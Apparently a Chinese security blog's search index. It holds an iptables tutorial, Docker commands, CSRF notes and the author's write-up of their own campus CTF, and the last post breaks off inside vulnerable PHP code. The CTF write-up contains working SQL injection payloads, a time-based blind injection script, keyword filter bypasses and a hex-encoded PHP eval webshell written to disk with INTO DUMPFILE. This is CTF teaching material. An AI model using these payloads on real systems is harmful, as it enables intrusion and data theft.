<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[iptables的简单使用]]></title>
    <url>%2F2017%2F12%2F21%2Fiptables%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[作为出题人，考虑到学弟们不会肝通宵猝死，就需要关闭web题目。当时百度说用iptables结果华丽的失败了，最后还是潇洒的断网来拒绝服务。后来还是重新看了一下这个命令，发现还真是好用啊… 原理来自老师ppt，命令详解转自http://blog.chinaunix.net/uid-26495963-id-3279216.html 基本原理先回顾一下防火墙的原理吧 防火墙通过审查经过的每一个数据包，判断它是否有相匹配的过滤规则，根据规则的先后顺序进行一一比较，直到满足其中的一条规则为止，然后依据控制机制做出相应的动作。如果都不满足，则将数据包丢弃，从而保护网络的安全。 包过滤分为：静态包过滤、状态包过滤. 静态包过滤：在IP层只根据IP包的源及目的地址，协议类型，端口号进行过滤，安全性较差，不能应对现在复杂的网络应用 iptables相关概念： netfilter/iptabels是与Linux内核集成的包过滤防火墙系统，简称iptables。 几乎所有的linux发行版本都会包含iptables的功能，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换NAT等功能。 在linux 内核中的模块被称为 netfilter。 tables相关概念：iptables内置了filter，nat和mangle三张表,分别用于实现包过滤，网络地址转换和包重构的功能。 filter负责过滤数据包，包括的规则链有input，output和forward。 nat则涉及到网络地址转换，包括的规则链有prerouting，postrouting和output； mangle表则主要应用在修改数据包内容上，用来做流量整形的，默认的规则链有：INPUT，OUTPUT，NAT，POSTROUTING，PREROUTING input匹配目的IP是本机的数据包。 output匹配源IP是本机的数据包。 forward匹配流经本机的数据包。 prerouting用来修改目的地址用来做DNAT。 postrouting用来修改源地址用来做SNAT。 chains相关概念： 链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。 如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。 rules相关概念： 规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。 配置防火墙的主要工作就是添加、修改和删除这些规则。 注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。 iptables传输数据包的过程： 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据路由表和数据包目的IP判断是否需要转送出去。 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。 如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。 iptables操作规则写法：格式：iptables [-t table] COMMAND chain CRETIRIA -j ACTION -t table ：3个filter nat mangle，默认是filter COMMAND：定义如何对规则进行管理 chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的 CRETIRIA:指定匹配标准 -j ACTION :指定如何进行处理 123456比如：不允许172.16.0.0/24的进行访问。iptables -t filter -A INPUT -s 172.16.0.0/16 -p udp --dport 53 -j DROP当然你如果想拒绝的更彻底：iptables -t filter -R INPUT 1 -s 172.16.0.0/16 -p udp --dport 53 -j REJECT查看定义规则的详细信息:iptables -L -n -v COMMAND详解：chains管理：12345678910111213141516171819-P :设置默认策略的，默认策略一般只有两种iptables -P INPUT (DROP|ACCEPT) 默认是关的/默认是开的比如：iptables -P INPUT DROP 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接的所有规则包括Xshell连接之类的，远程连接都被拒绝了。-F: FLASH，清空规则链的(注意每个链的管理权限)iptables -t nat -F PREROUTINGiptables -t nat -F 清空nat表的所有链 -N:NEW 支持用户新建一个链iptables -N inbound_tcp_web 表示附在tcp表上用于检查web的。 -X: 用于删除用户自定义的空链使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了 -E：用来Rename chain主要是用来给用户自定义的链重命名 -Z：清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节） rules管理：1234567-A：追加规则 -I num : 插入规则。比如说：-I 3 表示插入为第三条 -R num：替换/修改第几条规则 -D num：删除第几条规则 查看管理：参数是-L，子命令如下：1234567891011121314-n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。 -v：显示详细信息 -vv -vvv :越多越详细 -x：在计数器上显示精确值 --line-numbers : 显示规则的行号 -t nat：显示所有的关卡的信息 CRETIRIA详解：地址匹配：1234567891011-s：指定作为源地址匹配，这里不能指定主机名称，必须是IPIP | IP/MASK | 0.0.0.0/0.0.0.0而且地址可以取反，加一个“!”表示除了哪个IP之外 -d：表示匹配目标地址，使用同-s-p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP） -i eth0：从这块网卡流入的数据，流入一般用在INPUT和PREROUTING上-o eth0：从这块网卡流出的数据，流出一般在OUTPUT和POSTROUTING上 协议扩展： -p tcp :TCP协议的扩展。一般有三种扩展12345678--dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如:--dport 21 或者 --dport 21-23 (此时表示21,22,23)--sport：指定源端口--tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG） 对于它，一般要跟两个参数： 1.检查的标志位 2.必须为1的标志位 --tcp-flags syn,ack,fin,rst syn = --syn 表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做--syn -p udp：UDP协议的扩展12--dport--sport -p icmp：icmp数据报文的扩展1234--icmp-type：echo-request(请求回显)，一般用8 来表示所以 --icmp-type 8 匹配请求回显数据包echo-reply （响应的数据包）一般用0来表示 显式扩展(-m)扩展各种模块 -m multiport:表示启用多端口扩展 12打开21，23,80这三个不连续端口-m multiport --dports 21,23,80 -m mac –mac-source:表示mac源地址 12源mac地址为00:0c:29:27:55:3F-m mac --mac-source 00:0c:29:27:55:3F -m –iprange –src-range:表示源IP范围 12源IP地址为192.168.1.20-192.168.1.99-m iprange --src-range 192.168.1.20-192.168.1.99 -m state –state：表示数据包连接状态 12新的数据包-m state --state NEW ACTION详解：常用的ACTION： DROP：悄悄丢弃，一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表 REJECT：明示拒绝 ACCEPT：接受 custom_chain：转向一个自定义的链 MASQUERADE：源地址伪装 REDIRECT：重定向：主要用于实现端口重定向 MARK：打防火墙标记的 RETURN：返回，在自定义链执行完毕后使用返回，来返回原规则链 记录一下常见的命令： 只要是来自于172.16.0.0/16网段的都允许访问我本机的172.16.100.1的SSHD服务分析：首先肯定是在允许表中定义的。因为不需要做NAT地址转换之类的，然后查看我们SSHD服务，在22号端口上，处理机制是接受，对于这个表，需要有一来一回两个规则，如果我们允许也好，拒绝也好，对于访问本机服务，我们最好是定义在INPUT链上，而OUTPUT再予以定义就好。(会话的初始端先定义)，所以加规则就是：123456定义进来的： iptables -t filter -A INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp --dport 22 -j ACCEPT定义出去的： iptables -t filter -A OUTPUT -s 172.16.100.1 -d 172.16.0.0/16 -p tcp --dport 22 -j ACCEPT将默认策略改成DROP: iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP 假如我们允许自己ping别人，但是别人ping自己ping不通如何实现呢？分析：对于ping这个协议，进来的为8（ping），出去的为0(响应).我们为了达到目的，需要8出去,允许0进来，也就相当于我们要求我们只发送请求包，接收响应包(符合ping别人的要求，不符合别人ping自己的要求)12在出去的端口上：iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT在进来的端口上：iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT 结果如下：没设规则之前，双方都能ping通设了规则此时只能ping别人，别人ping不到了 拒绝进入防火墙的所有ICMP协议数据包1iptables -I INPUT -p icmp -j REJECT 允许防火墙转发出ICMP协议外所有数据包1iptables -A FORWARD -p !icmp -j ACCEPT 拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段12iptables -A FORWARD -s 192.168.1.11 -j REJECT iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT 说明：注意要把拒绝的放在前面不然就不起作用了啊。 封堵网段(192.168.1.0/24)，两小时后解封123# iptables -I INPUT -s 192.168.1.0/24 -j DROP # iptables -I FORWARD -s 192.168.1.0/24 -j DROP # at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1 只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP 允许本机开放从TCP端口20-1024提供的应用服务。12iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPTiptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT 允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。12iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT 禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包1iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP 说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。咱们这里用“-m mac –mac-source”来表示数据包的源MAC地址。 允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-12801iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT 说明：这里用“-m multiport –dport”来指定目的端口及范围 禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。1iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP 说明：此处用“-m –iprange –src-range”指定IP范围。 禁止转发与正常TCP连接无关的非—syn请求数据包。1iptables -A FORWARD -p tcp -m state --state NEW ! --syn -j DROP 说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！ 拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包12iptables -A INPUT -p tcp -m state --state NEW -j DROPiptalbes -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包，“RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。]]></content>
      <tags>
        <tag>运维</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker基本操作]]></title>
    <url>%2F2017%2F12%2F20%2Fdocker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[前段时间一直在耍docker，为了防止遗忘还是记录一下这些基本命令吧。 查找镜像：1docker search web 下载镜像：1docker pull php 上传镜像：1docker push err0r/web 上传镜像前需要先登录仓库，我这里用的是默认仓库–dockerhub，然后需要打个tag查看本地镜像：1docker images 启动docker：1docker run [OPTIONS] IMAGE [COMMAND] [ARG...] OPTIONS说明： -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； --name=&quot;nginx-lb&quot;: 为容器指定一个名称； --dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； --dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h &quot;mars&quot;: 指定容器的hostname； -e username=&quot;ritchie&quot;: 设置环境变量； --env-file=[]: 从指定文件读入环境变量； --cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； --net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； --link=[]: 添加链接到另一个容器； --expose=[]: 开放一个端口或一组端口； 虽然这么多参数，但是我基本上只有-it来启动交互式bash，用-p hostport:dockerport来开启端口映射，--name来指定容器名称image的话，会先搜索本地的image有没有，如果没有的话，再去仓库找。查看正在运行的docker：1docker ps 后面的话暂时只用过-a来列出所有docker(包括停止了的docker)，-l来查看最新创建的docker，-q只列出docker的id退出docker：1ctrl+p+q || exit 安全退出docker，docker仍然在后台运行而不是关闭重新进入docker：1docker exec -it 9d /bin/bash 值得一提的是，在docker命令中不一定要把id全部都打出来，只要打出能识别唯一的docker的部分就好了，比如9d，电脑就能找到这个docker就ok了。docker重新变成image：1docker commit 9d test 先接docker，再接生成的image的名字docker停止：1docker stop 9d 值得一提的是，不管之后删image还是删docker，都需要先停止全部相关的docker才能删除成功。docker删除：1docker rm 9d 可以看到连ps -a都看不到这个9d的容器了。这里有个骚操作，如果要想批量启动停止或者删除docker，可以用以下的命令,不过有一点，删除一定要记得先停止。123docker start $(docker ps -a -q)docker stop $(docker ps -a -q)docker rm $(docker ps -a -q) 镜像删除1docker rmi test 就先这些吧，以后碰到需要记得再记吧。]]></content>
      <tags>
        <tag>docker</tag>
        <tag>基础命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF学习]]></title>
    <url>%2F2017%2F12%2F15%2FCSRF%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近在看道哥的《白帽子讲web安全》(大学买的第一本书)，觉得物超所值啊~把书上的一些简单的实验给复现一下，记录一下。 浏览器的cookie策略浏览器的cookie分两种：一种是“Session Cookie”，又称“临时Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie”。 两者的区别在于，Third-party Cookie是服务器在Set-Cookie是指定了Expire时间，只有到了时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了。 例如在http://67.209.184.30/a.php中，会给浏览器写入两个Cookie：一个是Session Cookie，另一个为Third-party Cookie。1234&lt;?phpheader(&apos;set-cookie: cookie1=test1;&apos;);header(&apos;set-cookie: cookie2=test2;expires=Thu,01-jan-2030 00:00:01 GMT;&apos;,false);?&gt; 访问该页面，发现浏览器接受了两个Cookie。 此时在另外一个域中，有一个页面http://127.0.0.1/index.html，此页面构造了CSRF以访问67.209.184.301&lt;iframe src=&quot;http://67.209.184.30/&quot;&gt;&lt;/iframe&gt; 此时如果是IE，会默认禁止浏览器在、、、等标签中发送第三方Cookie，也就是说只能发送出Session Cookie，而Third-party Cookie被禁止。 但是因为我是用的Firefox，所以默认策略是允许发送第三方Cookie的 P3P头的副作用如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是、等标签也将不再拦截第三方Cookie的发送。 假设127.0.0.1/index.html的内容为：12]]></content>
      <tags>
        <tag>《白帽子讲web安全》</tag>
        <tag>书籍学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一届智商杯wp]]></title>
    <url>%2F2017%2F12%2F11%2F%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%99%BA%E5%95%86%E6%9D%AFwp%2F</url>
    <content type="text"><![CDATA[周末出题老表伤透了心，原本高高兴兴的打算直接用做出来的童鞋的wp，结果发现没人做，还是得自己写… Crypto这次的密码题都是偏向简单的题目 女神的短信提示短信，手机键盘九宫格加密，前面那个数字表示第几个按钮，后面那个数字表示那个按钮第几个(没想到最后变成了真正的签到题，看着动态积分从1000变到20，emmmmm所有队伍都做出来了)。 签到题–RSA最基本的rsa解密，直接贴py代码123456789import gmpy2p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389c = 4058547387436141457047422472489672162421145320474233882240312859636305303864e = 65537inv_n = (p-1)*(q-1)d = gmpy2.invert(e,inv_n)m = pow(c,d,p*q)print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;) RSA2上课也讲过的共模攻击，最让老表伤心的是没有一个人去看老表的上课用的课件https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/还是直接贴代码吧12345678910111213141516171819202122232425262728293031c1=0x1cbd53af140710b23864f60e8d0741951b89bd03ce4d73573b0e8bb4d33b36a624e645312613b06759cfa9c4fa00bf8d4781a8e89aLc2=0x5a87c76d2d79694e75ad2911c44d8208a7447852f26b37480dbc9d376579add2bed957db9b76fd16c60cccbbc9e901dddfe9a1eb3Ln=6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249e1=839e2=773def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % ms = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;) 有意思的解密下载zip里面有两个文件，key.txt是一串十六进制，转化一下得到key=&#39;i_think_zz_is_ok&#39;，然后flag.py文件是rc4的加密函数，对着加密函数逆推一个解密函数即可(有童鞋百度出解密函数也算是不预期解吧，其实耐心推一下也很快的)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import randomimport base64from hashlib import sha1strCipher = &apos;dOo0foiNBuQvKQ1oEdPiLawHQHtwYoGZu6CsmQwM4MD9Rkz0VVMzJTcz0/EDmHAwhgg16VA0MulkmKYnzNnFk9cwJAG6FQ==&apos;key = &apos;i_think_zz_is_ok&apos;def crypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return &apos;&apos;.join(out)def decrypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 data1=[] for char in data: x=(x+1)%256 y=(y+box[x])%256 box[x],box[y] = box[y], box[x] data1.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return &apos;&apos;.join(data1) def encode(data, key, encode=base64.b64encode, salt_length=16): salt = &apos;&apos; for n in range(salt_length): salt += chr(random.randrange(256)) #salt=&apos;11&apos; data = salt + crypt(data, sha1(key + salt).digest()) if encode: data = encode(data) return datadef decode(data, key, decode=base64.b64decode, salt_length=16): salt = &apos;&apos; if decode: data=decode(data) for n in range(salt_length): salt += chr(random.randrange(256)) #salt=&apos;11&apos; salt=data[:16] out=data[16:] return decrypt(out,sha1(key + salt).digest()) print decode(strCipher,key) 简单加密这题讲道理比上一题要简单，但是因为上一题网上有rc4的解密代码，所以做出来的人比这题多…原题目，flag.py:123456789101112131415161718192021222324252627282930from hashlib import sha256key = &apos;zjgsctf&apos;cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos;def xor(a,b): return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])def HASH(data): return sha256(data).digest()[:8]def bes_encrypt(subkeys, data): i = 0 d1 = data[:8] d2 = data[8:] for i in subkeys: d1 = xor(xor(HASH(d2),i),d1) d1,d2 = d2,d1 return d2 + d1def key_schedule(key): subKeys = [] subKey = key for i in xrange(16): subKey = HASH(subKey) subKeys.append(subKey) return subKeysdef bes(key,data): subKeys = key_schedule(key) return bes_encrypt(subKeys, data).encode(&apos;hex&apos;) 观察代码可以发现，对key的操作变换并没有涉及随机数，所以加密用的subkeys和解密用的subkeys是一样的。然后就可以对着bes_encrypt的代码逆着写一份bes_decrypt出来，代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from hashlib import sha256def xor(a,b): return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])def HASH(data): return sha256(data).digest()[:8]def bes_encrypt(subkeys, data): i = 0 d1 = data[:8] d2 = data[8:] print d2.encode(&apos;hex&apos;) for i in subkeys: d1 = xor(xor(HASH(d2),i),d1) d1,d2 = d2,d1 return d2 + d1def bes_decrypt(subkeys,data): data = data.decode(&apos;hex&apos;) d2 = data[:8] d1 = data[8:] subkeys=subkeys[::-1] for i in subkeys: d1,d2=d2,d1 d1 = xor(xor(HASH(d2),i),d1) return d1+d2def key_schedule(key): subKeys = [] subKey = key for i in xrange(16): subKey = HASH(subKey) subKeys.append(subKey) return subKeysdef bes(key,data): subKeys = key_schedule(key) return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)def besdd(key,data): subKeys = key_schedule(key) return bes_decrypt(subKeys, data)if __name__ == &quot;__main__&quot;: key = &apos;zjgsctf&apos; cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos; print besdd(key,cipher) web我原以为…算了，想想某涛的pwn一题都没被做出来，我心里还是有点安慰的。 签到题–sql1右键源码可以看到php源码对输入的两个参数都没加任何过滤，而且只需要sql查询有结果即可返回flag，最简单的payload就是username=’ or 1=1#&amp;password= 又一个签到题我一开始以为这种题目大家应该都做吐了的，所以又是送分题…后来发现并不是这样…一开始说Only localhost can get flag!，那修改一下http请求头里的x-forwarded-for为127.0.0.1，然后发现变成了Only Chinese can get flag!，那修改一下语言，将Accept-Language中的en-US 去掉，得到flag Lazy壮壮–sql2测试一下会发现没有回显，猜测是时间盲注。然后试了试sleep方法，会发现被过滤了，而且这个题目只过滤了sleep。那么咋们就换一个函数好了，换成benchmark，其他的还是原来的配方，写个盲注脚本就好了(这里我先在本地试了下benchmark(20000000,md5(&#39;test&#39;))大概需要7秒多，你们也可以自行更改参数来调整)。这里友情提示一下，你们可以把这些脚本收集一下，以后可以直接修改脚本，做题效率会高很多1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &apos;http://10.21.13.152:20001/check.php&apos;payloads=&apos;1234567890qwertyuiopasdfghjklzxcvbnm_@QWERTYUIOPASDFGHJKLZXCVBNM,*&apos;def exp(i,x): #sql2.users233.p4sswo3d #xx = &quot;&apos; or if(substring((select database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; #xx = &quot;&apos; or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; #xx = &quot;&apos; or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users233&apos;) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; xx = &quot;&apos; or if(substring((select group_concat(p4sswo3d) from users233) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; data=&#123;&apos;id&apos;:xx %(i,x)&#125; first_time=time.time() response = requests.post(url,data = data) next_time=time.time() if (next_time-first_time) &gt; 2: return 1 else : return 0ans=&apos;&apos;print &apos;star&apos;for i in range(1,100): for x in payloads: if exp(i,x)==1: ans+=x print ans break if x==&apos;*&apos;: print &quot;over&quot; break 解出来两个md5值，去cmd5解一下，一个是’no’，另一个是’hacker’。提交hacker即可。 其实很简单–sql3右键源码可以看到提示说需要?id，或者遇到这种什么都没有的题目的思路一般都是源码泄露(我题目也说了’壮壮好像泄露了什么…’)，这里是.index.php.swp文件泄露，下载下来之后用vim -r打开即可恢复源码。观察源码，会发现是数字型注入，而且过滤了很多函数。但是同时也发现有个不起眼但是很“多余”的函数strip_tags，这个函数拿去百度一下：1strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 这样一切的过滤都可以轻松绕过了，只需要将select改成sele&lt;br&gt;ct这样，即在中间加上html标签即可，如下测试： 接下来就是最基本的sql注入了，就不多啰嗦了，直接贴payload：12345列数：http://10.21.13.152:20002/?id=1 o&lt;br&gt;rder b&lt;br&gt;y 3库名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,database(),3表名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct ta&lt;br&gt;ble_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()列名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct column_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()and ta&lt;br&gt;ble_name=&apos;flag_here&apos;数据：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(passwdzz),3 fr&lt;br&gt;om flag_here 因为我题目里用了limit，所以这里最好用group_concat来获得所有数据，然后用distinct来去掉重复的。 好心的壮壮–sql4这个题目我把源码贴了上去，观察源码可以发现有两个文件，一个是index.php，另一个是include.php。一个注入题为什么要给文件包含的函数呢，这不是明摆着让你们用sql写木马，然后去包含嘛，心塞塞… 再看index.php，我用每个人的ip来作为目录名创建了一个权限777的目录，然后再去进行正常的sql代码(这么明显的提示…)。然后我们还会发现，并没有过滤掉dumpfile以及outfile以及into。现在目标明确，一切就绪，准备用sql语句写个木马吧。1post:id=-1 union select 0x3c3f706870206576616c28245f504f53545b22616161225d293b203f3e into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos; 这里有个全场唯一的一个小坑，就是如果你是正常的写’&lt;?php eval($_POST[“aaa”]); ?&gt;’这个一句话木马的话，中间php部分会消失掉，like this:1post:id=-1 union select &quot;&lt;?php eval($_POST[&apos;aaa&apos;]); ?&gt;&quot; into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos; 所以，好心的壮壮又给你们个送分，把你们发送过去的东西打印出来。所以我们选择用十六进制来绕过这个坑点。然后用include.php去包含就好了 然后连菜刀去吧。 随便翻翻目录就可以找到目录 babyweb这个题目算是基本套路吧…我提示也是反复强调伪协议，可是最后还是只有master一个队做出来，心塞塞… 看到url里有个?page，先想到filter伪协议去读源码，然后把所有源码都爬下来之后，主要的几个文件如下:upload.php:1234567891011121314151617181920212223242526272829303132333435363738394041&lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &apos;config.php&apos;;function get_random_token()&#123; $random_token = &apos;&apos;; $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;; for($i = 0; $i &lt; 16; $i++)&#123; $random_token .= substr($str, rand(1, 61), 1); &#125; return $random_token;&#125; if (isset($_POST[&apos;Upload&apos;])) &#123; $target_path =&quot;./Err0r/&quot;; $target_name=get_random_token(); $target_path = $target_path . $target_name; $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;]; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1); $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;png&quot; || $uploaded_ext == &quot;PNG&quot;|| $uploaded_ext == &quot;gif&quot; || $uploaded_ext == &quot;GIF&quot;|| $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123; if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path.&quot;.&quot;.$uploaded_ext)) &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo $target_path .&quot;.&quot;.$uploaded_ext .&apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125;?&gt; include.php:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; &lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);include &apos;config.php&apos;;if (isset($_GET[&apos;page&apos;])) &#123; $page = $_GET[&apos;page&apos;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = $page . &quot;.php&quot;;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;My PHP Website&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div 